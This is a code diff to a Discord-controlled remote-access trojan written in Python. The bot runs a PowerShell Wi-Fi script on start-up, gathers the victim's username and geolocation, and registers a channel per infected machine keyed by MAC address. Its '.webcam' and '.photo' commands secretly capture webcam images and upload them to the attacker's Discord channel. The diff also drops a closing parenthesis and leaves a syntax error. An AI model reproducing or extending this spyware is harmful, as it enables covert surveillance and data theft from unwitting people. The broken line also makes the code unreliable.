@@ -64,7 +64,8 @@ async def find_channel_by_name(guild, channel_name):
         if channel.name == channel_name:
             return channel
     return None
-
+global mac_address
+mac_address = str(get_mac())
 @client.event
 async def on_ready():
     output = subprocess.Popen(["powershell.exe", wifi_script], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).communicate()[0]
@@ -77,8 +78,7 @@ async def on_ready():
     latitude = data.get('latitude')
     longitude = data.get('longitude')
     username = os.getlogin()
-    guild = client.get_guild(int(guild_id))
-    mac_address = str(get_mac())
+    guild = client.get_guild(int(guild_id)
     channel = await find_channel_by_name(guild, mac_address)
     if channel:
         embed=discord.Embed(title="**Connection Reestablished with: ** ```" + username +"```",colour=0x3)
@@ -125,7 +125,7 @@ async def on_message(message):
     guild = client.get_guild(int(guild_id))
     if message.author != client.user:
     
-        if message.channel.name == str(get_mac()): 
+        if message.channel.name == mac_address: 
             
             match message.content.lower():
                 case ".help":
@@ -218,13 +218,13 @@ async def on_message(message):
                     webcam = VideoCapture(0, CAP_DSHOW)
                     result, image = webcam.read()
                     imwrite('webcam.png', image)
-                    await message.channel.send(embed=discord.Embed(title=' `[Image of User with ID:' +str(get_mac())+'`]' ).set_image(url='attachment://webcam.png'), file=discord.File('webcam.png'))
+                    await message.channel.send(embed=discord.Embed(title=' `[Image of User with ID:' + mac_address +'`]' ).set_image(url='attachment://webcam.png'), file=discord.File('webcam.png'))
                     subprocess.run('del webcam.png', shell=True)
                 case ".photo":
                     webcam = VideoCapture(0, CAP_DSHOW)
                     result, image = webcam.read()
                     imwrite('webcam.png', image)
-                    await message.channel.send(embed=discord.Embed(title=' `[Image of User with ID:' +str(get_mac())+'`]' ).set_image(url='attachment://webcam.png'), file=discord.File('webcam.png'))
+                    await message.channel.send(embed=discord.Embed(title=' `[Image of User with ID:' +mac_address+'`]' ).set_image(url='attachment://webcam.png'), file=discord.File('webcam.png'))
                     subprocess.run('del webcam.png', shell=True)
 
                 case ".purge":  
